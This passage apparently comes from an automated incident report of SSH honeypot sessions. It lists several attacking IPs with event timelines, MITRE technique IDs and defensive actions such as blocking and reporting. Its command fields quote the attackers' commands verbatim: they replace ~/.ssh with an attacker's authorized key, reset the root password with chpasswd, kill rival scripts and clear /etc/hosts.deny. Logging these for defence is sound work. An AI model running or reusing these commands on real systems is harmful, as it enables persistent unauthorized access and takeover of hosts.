| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 15:37:27` | `cowrie.session.connect` |
| `2026-04-27 15:37:28` | `cowrie.client.version` |
| `2026-04-27 15:37:28` | `cowrie.client.kex` |
| `2026-04-27 15:37:29` | `cowrie.login.success` |
| `2026-04-27 15:37:29` | `cowrie.session.params` |
| `2026-04-27 15:37:29` | `cowrie.command.input` |
| `2026-04-27 15:37:29` | `cowrie.command.failed` |
| `2026-04-27 15:37:29` | `cowrie.log.closed` |
| `2026-04-27 15:37:30` | `cowrie.session.params` |
| `2026-04-27 15:37:30` | `cowrie.command.input` |
| `2026-04-27 15:37:31` | `cowrie.session.file_download` |
| `2026-04-27 15:37:31` | `cowrie.log.closed` |
| `2026-04-27 15:37:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.213.96[.]6` to AbuseIPDB if not already reported
- [ ] Block `211.213.96[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f036edd9acf6

| Field | Detail |
|---|---|
| **Source IP** | `211.213.96[.]6` |
| **First Seen** | 2026-04-27 15:37 |
| **Last Seen** | 2026-04-27 15:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 15:37:33` | `cowrie.session.connect` |
| `2026-04-27 15:37:33` | `cowrie.client.version` |
| `2026-04-27 15:37:33` | `cowrie.client.kex` |
| `2026-04-27 15:37:34` | `cowrie.login.success` |
| `2026-04-27 15:37:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.213.96[.]6` to AbuseIPDB if not already reported
- [ ] Block `211.213.96[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-848973e5585c

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]165` |
| **First Seen** | 2026-04-27 15:52 |
| **Last Seen** | 2026-04-27 15:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 15:52:58` | `cowrie.session.connect` |
| `2026-04-27 15:52:58` | `cowrie.client.version` |
| `2026-04-27 15:52:58` | `cowrie.client.kex` |
| `2026-04-27 15:52:59` | `cowrie.login.success` |
| `2026-04-27 15:52:59` | `cowrie.session.params` |
| `2026-04-27 15:52:59` | `cowrie.command.input` |
| `2026-04-27 15:52:59` | `cowrie.command.failed` |
| `2026-04-27 15:52:59` | `cowrie.log.closed` |
| `2026-04-27 15:52:59` | `cowrie.session.params` |
| `2026-04-27 15:52:59` | `cowrie.command.input` |
| `2026-04-27 15:53:00` | `cowrie.session.file_download` |
| `2026-04-27 15:53:00` | `cowrie.log.closed` |
| `2026-04-27 15:53:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]165` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-474e1f572bb8

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]165` |
| **First Seen** | 2026-04-27 15:53 |
| **Last Seen** | 2026-04-27 15:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 15:53:02` | `cowrie.session.connect` |
| `2026-04-27 15:53:02` | `cowrie.client.version` |
| `2026-04-27 15:53:02` | `cowrie.client.kex` |
| `2026-04-27 15:53:02` | `cowrie.login.success` |
| `2026-04-27 15:53:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]165` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1211b015ba22

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]138` |
| **First Seen** | 2026-04-27 16:16 |
| **Last Seen** | 2026-04-27 16:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 16:16:49` | `cowrie.session.connect` |
| `2026-04-27 16:16:49` | `cowrie.client.version` |
| `2026-04-27 16:16:49` | `cowrie.client.kex` |
| `2026-04-27 16:16:50` | `cowrie.login.success` |
| `2026-04-27 16:16:50` | `cowrie.session.params` |
| `2026-04-27 16:16:50` | `cowrie.command.input` |
| `2026-04-27 16:16:50` | `cowrie.command.failed` |
| `2026-04-27 16:16:50` | `cowrie.log.closed` |
| `2026-04-27 16:16:50` | `cowrie.session.params` |
| `2026-04-27 16:16:50` | `cowrie.command.input` |
| `2026-04-27 16:16:51` | `cowrie.session.file_download` |
| `2026-04-27 16:16:51` | `cowrie.log.closed` |
| `2026-04-27 16:16:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]138` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66840c9e6a14

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]138` |
| **First Seen** | 2026-04-27 16:16 |
| **Last Seen** | 2026-04-27 16:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 16:16:52` | `cowrie.session.connect` |
| `2026-04-27 16:16:52` | `cowrie.client.version` |
| `2026-04-27 16:16:53` | `cowrie.client.kex` |
| `2026-04-27 16:16:53` | `cowrie.login.success` |
| `2026-04-27 16:16:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]138` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbd74b7087e5

| Field | Detail |
|---|---|
| **Source IP** | `114.217.10[.]60` |
| **First Seen** | 2026-04-27 16:30 |
| **Last Seen** | 2026-04-27 16:30 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:wqypaMoBgSPi"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 16:30:24` | `cowrie.session.connect` |
| `2026-04-27 16:30:24` | `cowrie.client.version` |
| `2026-04-27 16:30:24` | `cowrie.client.kex` |
| `2026-04-27 16:30:25` | `cowrie.login.success` |
| `2026-04-27 16:30:25` | `cowrie.session.params` |
| `2026-04-27 16:30:25` | `cowrie.command.input` |
| `2026-04-27 16:30:25` | `cowrie.command.failed` |
| `2026-04-27 16:30:25` | `cowrie.log.closed` |
| `2026-04-27 16:30:26` | `cowrie.session.params` |
| `2026-04-27 16:30:26` | `cowrie.command.input` |
| `2026-04-27 16:30:26` | `cowrie.session.file_download` |
| `2026-04-27 16:30:26` | `cowrie.log.closed` |
| `2026-04-27 16:30:42` | `cowrie.session.params` |
| `2026-04-27 16:30:42` | `cowrie.command.input` |
| `2026-04-27 16:30:42` | `cowrie.log.closed` |
| `2026-04-27 16:30:42` | `cowrie.session.params` |
| `2026-04-27 16:30:42` | `cowrie.command.input` |
| `2026-04-27 16:30:42` | `cowrie.log.closed` |
| `2026-04-27 16:30:43` | `cowrie.session.params` |
| `2026-04-27 16:30:43` | `cowrie.command.input` |
| `2026-04-27 16:30:43` | `cowrie.session.file_download` |
| `2026-04-27 16:30:43` | `cowrie.log.closed` |
| `2026-04-27 16:30:43` | `cowrie.session.params` |
| `2026-04-27 16:30:43` | `cowrie.command.input` |
| `2026-04-27 16:30:43` | `cowrie.log.closed` |
| `2026-04-27 16:30:44` | `cowrie.session.params` |
| `2026-04-27 16:30:44` | `cowrie.command.input` |
| `2026-04-27 16:30:44` | `cowrie.log.closed` |
| `2026-04-27 16:30:44` | `cowrie.session.params` |
| `2026-04-27 16:30:44` | `cowrie.command.input` |
| `2026-04-27 16:30:44` | `cowrie.command.input` |
| `2026-04-27 16:30:44` | `cowrie.log.closed` |
| `2026-04-27 16:30:45` | `cowrie.session.params` |
| `2026-04-27 16:30:45` | `cowrie.command.input` |
| `2026-04-27 16:30:45` | `cowrie.log.closed` |
| `2026-04-27 16:30:45` | `cowrie.session.params` |
| `2026-04-27 16:30:45` | `cowrie.command.input` |
| `2026-04-27 16:30:45` | `cowrie.log.closed` |
| `2026-04-27 16:30:46` | `cowrie.session.params` |
| `2026-04-27 16:30:46` | `cowrie.command.input` |
| `2026-04-27 16:30:46` | `cowrie.log.closed` |
| `2026-04-27 16:30:46` | `cowrie.session.params` |
| `2026-04-27 16:30:46` | `cowrie.command.input` |
| `2026-04-27 16:30:46` | `cowrie.log.closed` |
| `2026-04-27 16:30:47` | `cowrie.session.params` |
| `2026-04-27 16:30:47` | `cowrie.command.input` |
| `2026-04-27 16:30:47` | `cowrie.log.closed` |
| `2026-04-27 16:30:47` | `cowrie.session.params` |
| `2026-04-27 16:30:47` | `cowrie.command.input` |
| `2026-04-27 16:30:47` | `cowrie.log.closed` |
| `2026-04-27 16:30:47` | `cowrie.session.params` |
| `2026-04-27 16:30:47` | `cowrie.command.input` |
| `2026-04-27 16:30:48` | `cowrie.log.closed` |
| `2026-04-27 16:30:48` | `cowrie.session.params` |
| `2026-04-27 16:30:48` | `cowrie.command.input` |
| `2026-04-27 16:30:48` | `cowrie.log.closed` |
| `2026-04-27 16:30:48` | `cowrie.session.params` |
| `2026-04-27 16:30:48` | `cowrie.command.input` |
| `2026-04-27 16:30:48` | `cowrie.log.closed` |
| `2026-04-27 16:30:49` | `cowrie.session.params` |
| `2026-04-27 16:30:49` | `cowrie.command.input` |
| `2026-04-27 16:30:49` | `cowrie.log.closed` |
| `2026-04-27 16:30:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.217.10[.]60` to AbuseIPDB if not already reported
- [ ] Block `114.217.10[.]60` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f15ece74a879

| Field | Detail |
|---|---|
| **Source IP** | `101.96.199[.]69` |
| **First Seen** | 2026-04-27 16:33 |
| **Last Seen** | 2026-04-27 16:33 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:1VKX8BC8i8Jk"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 16:33:14` | `cowrie.session.connect` |
| `2026-04-27 16:33:14` | `cowrie.client.version` |
| `2026-04-27 16:33:14` | `cowrie.client.kex` |
| `2026-04-27 16:33:15` | `cowrie.login.success` |
| `2026-04-27 16:33:15` | `cowrie.session.params` |
| `2026-04-27 16:33:15` | `cowrie.command.input` |
| `2026-04-27 16:33:15` | `cowrie.command.failed` |
| `2026-04-27 16:33:15` | `cowrie.log.closed` |
| `2026-04-27 16:33:16` | `cowrie.session.params` |
| `2026-04-27 16:33:16` | `cowrie.command.input` |
| `2026-04-27 16:33:16` | `cowrie.session.file_download` |
| `2026-04-27 16:33:16` | `cowrie.log.closed` |
| `2026-04-27 16:33:32` | `cowrie.session.params` |
| `2026-04-27 16:33:32` | `cowrie.command.input` |
| `2026-04-27 16:33:32` | `cowrie.log.closed` |
| `2026-04-27 16:33:32` | `cowrie.session.params` |
| `2026-04-27 16:33:32` | `cowrie.command.input` |
| `2026-04-27 16:33:33` | `cowrie.log.closed` |
| `2026-04-27 16:33:33` | `cowrie.session.params` |
| `2026-04-27 16:33:33` | `cowrie.command.input` |
| `2026-04-27 16:33:33` | `cowrie.session.file_download` |
| `2026-04-27 16:33:33` | `cowrie.log.closed` |
| `2026-04-27 16:33:33` | `cowrie.session.params` |
| `2026-04-27 16:33:33` | `cowrie.command.input` |
| `2026-04-27 16:33:34` | `cowrie.log.closed` |
| `2026-04-27 16:33:34` | `cowrie.session.params` |
| `2026-04-27 16:33:34` | `cowrie.command.input` |
| `2026-04-27 16:33:34` | `cowrie.log.closed` |
| `2026-04-27 16:33:34` | `cowrie.session.params` |
| `2026-04-27 16:33:34` | `cowrie.command.input` |
| `2026-04-27 16:33:34` | `cowrie.command.input` |
| `2026-04-27 16:33:34` | `cowrie.log.closed` |
| `2026-04-27 16:33:35` | `cowrie.session.params` |
| `2026-04-27 16:33:35` | `cowrie.command.input` |
| `2026-04-27 16:33:35` | `cowrie.log.closed` |
| `2026-04-27 16:33:35` | `cowrie.session.params` |
| `2026-04-27 16:33:35` | `cowrie.command.input` |
| `2026-04-27 16:33:35` | `cowrie.log.closed` |
| `2026-04-27 16:33:36` | `cowrie.session.params` |
| `2026-04-27 16:33:36` | `cowrie.command.input` |
| `2026-04-27 16:33:36` | `cowrie.log.closed` |
| `2026-04-27 16:33:36` | `cowrie.session.params` |
| `2026-04-27 16:33:36` | `cowrie.command.input` |
| `2026-04-27 16:33:36` | `cowrie.log.closed` |
| `2026-04-27 16:33:37` | `cowrie.session.params` |
| `2026-04-27 16:33:37` | `cowrie.command.input` |
| `2026-04-27 16:33:37` | `cowrie.log.closed` |
| `2026-04-27 16:33:37` | `cowrie.session.params` |
| `2026-04-27 16:33:37` | `cowrie.command.input` |
| `2026-04-27 16:33:37` | `cowrie.log.closed` |
| `2026-04-27 16:33:37` | `cowrie.session.params` |
| `2026-04-27 16:33:37` | `cowrie.command.input` |
| `2026-04-27 16:33:38` | `cowrie.log.closed` |
| `2026-04-27 16:33:38` | `cowrie.session.params` |
| `2026-04-27 16:33:38` | `cowrie.command.input` |
| `2026-04-27 16:33:38` | `cowrie.log.closed` |
| `2026-04-27 16:33:38` | `cowrie.session.params` |
| `2026-04-27 16:33:38` | `cowrie.command.input` |
| `2026-04-27 16:33:38` | `cowrie.log.closed` |
| `2026-04-27 16:33:39` | `cowrie.session.params` |
| `2026-04-27 16:33:39` | `cowrie.command.input` |
| `2026-04-27 16:33:39` | `cowrie.log.closed` |
| `2026-04-27 16:33:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.199[.]69` to AbuseIPDB if not already reported
- [ ] Block `101.96.199[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28d4b40cd0a3

| Field | Detail |
|---|---|
| **Source IP** | `43.160.244[.]79` |
| **First Seen** | 2026-04-27 16:33 |
| **Last Seen** | 2026-04-27 16:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 16:33:25` | `cowrie.session.connect` |
| `2026-04-27 16:33:25` | `cowrie.client.version` |
| `2026-04-27 16:33:25` | `cowrie.client.kex` |
| `2026-04-27 16:33:25` | `cowrie.login.success` |
| `2026-04-27 16:33:26` | `cowrie.session.params` |
| `2026-04-27 16:33:26` | `cowrie.command.input` |
| `2026-04-27 16:33:26` | `cowrie.command.failed` |
| `2026-04-27 16:33:26` | `cowrie.log.closed` |
| `2026-04-27 16:33:26` | `cowrie.session.params` |
| `2026-04-27 16:33:26` | `cowrie.command.input` |
| `2026-04-27 16:33:26` | `cowrie.session.file_download` |
| `2026-04-27 16:33:26` | `cowrie.log.closed` |
| `2026-04-27 16:33:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.160.244[.]79` to AbuseIPDB if not already reported
- [ ] Block `43.160.244[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63215ed738d2

| Field | Detail |
|---|---|
| **Source IP** | `43.160.244[.]79` |
| **First Seen** | 2026-04-27 16:33 |
| **Last Seen** | 2026-04-27 16:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 16:33:28` | `cowrie.session.connect` |
| `2026-04-27 16:33:28` | `cowrie.client.version` |
| `2026-04-27 16:33:28` | `cowrie.client.kex` |
| `2026-04-27 16:33:29` | `cowrie.login.success` |
| `2026-04-27 16:33:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.160.244[.]79` to AbuseIPDB if not already reported
- [ ] Block `43.160.244[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e785b128c380

| Field | Detail |
|---|---|
| **Source IP** | `106.75.88[.]44` |
| **First Seen** | 2026-04-27 16:36 |
| **Last Seen** | 2026-04-27 16:36 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:hKRYnofX8It5"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 16:36:09` | `cowrie.session.connect` |
| `2026-04-27 16:36:09` | `cowrie.client.version` |
| `2026-04-27 16:36:10` | `cowrie.client.kex` |
| `2026-04-27 16:36:10` | `cowrie.login.success` |
| `2026-04-27 16:36:11` | `cowrie.session.params` |
| `2026-04-27 16:36:11` | `cowrie.command.input` |
| `2026-04-27 16:36:11` | `cowrie.command.failed` |
| `2026-04-27 16:36:11` | `cowrie.log.closed` |
| `2026-04-27 16:36:11` | `cowrie.session.params` |
| `2026-04-27 16:36:11` | `cowrie.command.input` |
| `2026-04-27 16:36:11` | `cowrie.session.file_download` |
| `2026-04-27 16:36:11` | `cowrie.log.closed` |
| `2026-04-27 16:36:25` | `cowrie.session.params` |
| `2026-04-27 16:36:25` | `cowrie.command.input` |
| `2026-04-27 16:36:25` | `cowrie.log.closed` |
| `2026-04-27 16:36:25` | `cowrie.session.params` |
| `2026-04-27 16:36:25` | `cowrie.command.input` |
| `2026-04-27 16:36:25` | `cowrie.log.closed` |
| `2026-04-27 16:36:26` | `cowrie.session.params` |
| `2026-04-27 16:36:26` | `cowrie.command.input` |
| `2026-04-27 16:36:26` | `cowrie.session.file_download` |
| `2026-04-27 16:36:26` | `cowrie.log.closed` |
| `2026-04-27 16:36:26` | `cowrie.session.params` |
| `2026-04-27 16:36:26` | `cowrie.command.input` |
| `2026-04-27 16:36:26` | `cowrie.log.closed` |
| `2026-04-27 16:36:27` | `cowrie.session.params` |
| `2026-04-27 16:36:27` | `cowrie.command.input` |
| `2026-04-27 16:36:27` | `cowrie.log.closed` |
| `2026-04-27 16:36:27` | `cowrie.session.params` |
| `2026-04-27 16:36:27` | `cowrie.command.input` |
| `2026-04-27 16:36:27` | `cowrie.command.input` |
| `2026-04-27 16:36:27` | `cowrie.log.closed` |
| `2026-04-27 16:36:28` | `cowrie.session.params` |
| `2026-04-27 16:36:28` | `cowrie.command.input` |
| `2026-04-27 16:36:28` | `cowrie.log.closed` |
| `2026-04-27 16:36:28` | `cowrie.session.params` |
| `2026-04-27 16:36:28` | `cowrie.command.input` |
